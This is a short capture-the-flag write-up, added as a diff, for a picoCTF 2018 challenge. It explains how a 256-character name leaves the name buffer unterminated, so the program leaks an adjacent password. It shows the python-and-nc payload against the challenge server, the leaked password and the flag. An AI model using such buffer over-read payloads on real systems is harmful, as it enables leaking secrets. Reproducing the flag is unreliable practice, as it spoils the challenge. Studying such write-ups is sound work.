@@ -1,0 +1,16 @@
+Looking at the source code, we see that the program retrieves input from the user using fgets,
+and replaces the newline with a null byte. However, the program does not check that the input
+provided by the user is within length of the buffer, which is 256.
+If we input 256 characters as our name, the null byte does not properly get placed at the end, allowing
+us to read past the name buffer and into the password buffer.
+
+$ python -c "print 'A'*256" | nc 2018shell3.picoctf.com 31045
+What is your name?
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,a_reAllY_s3cuRe_p4s$word_d98e8d
+$ nc 2018shell3.picoctf.com 31045
+What is your name?
+hi
+Hello hi,
+Please Enter the Password.
+a_reAllY_s3cuRe_p4s$word_d98e8d
+picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
